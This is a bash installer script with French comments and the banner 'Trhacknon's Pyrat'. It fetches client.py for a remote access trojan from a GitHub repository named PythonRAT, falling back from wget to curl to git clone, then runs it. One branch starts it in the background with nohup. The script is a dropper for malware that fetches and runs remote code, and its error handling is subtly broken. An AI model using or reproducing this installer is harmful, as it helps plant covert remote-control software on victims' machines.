#!/bin/bash

# Fonction pour afficher la bannière colorée
display_banner() {
    echo -e "\e[0;31mTrhacknon's Pyrat\e[0m"
}

# Fonction pour demander confirmation
confirm() {
    read -r -p "$1 [Y/n] " response
    if [[ "$response" =~ ^([yY][eE][sS]|[yY])+$ || "$response" == "" ]]; then
        return 0
    else
        return 1
    fi
}

# Afficher la bannière
display_banner

# Télécharger le client.py avec wget
confirm "Voulez-vous télécharger client.py avec wget?" && wget https://raw.githubusercontent.com/tucommenceapousser/PythonRAT/main/src/client.py

# Vérifier si le téléchargement avec wget a réussi
if [ $? -ne 0 ]; then
    # Essayer de télécharger avec curl
    confirm "Le téléchargement avec wget a échoué. Voulez-vous essayer avec curl?" && curl -O https://raw.githubusercontent.com/tucommenceapousser/PythonRAT/main/src/client.py && curl -O https://raw.githubusercontent.com/tucommenceapousser/PythonRAT/main/src/requirements.txt
fi

# Vérifier si le téléchargement avec curl a réussi
if [ $? -ne 0 ]; then
    # Cloner le repo en cas d'échec avec wget et curl
    confirm "Le téléchargement avec curl a échoué. Voulez-vous cloner le repo avec git?" && git clone https://github.com/tucommenceapousser/PythonRAT
    cd PythonRAT || exit

    # Vérifier si le répertoire "src" existe déjà
    if [ -d "src" ]; then
        echo "Le répertoire 'src' existe déjà."
    else
        # Créer le répertoire "src" s'il n'existe pas
        mkdir src
    fi

    # Lancer le client.py
    confirm "Voulez-vous lancer client.py?" && python src/client.py
else
    # Lancer le client.py téléchargé avec curl
    confirm "Voulez-vous lancer client.py téléchargé avec curl?" && mkdir src && cp requirements.txt src/ && cp client.py src/ && pip install -r src/requirements.txt --force --use-feature=content-addressable-pool && nohup python src/client.py &
fi
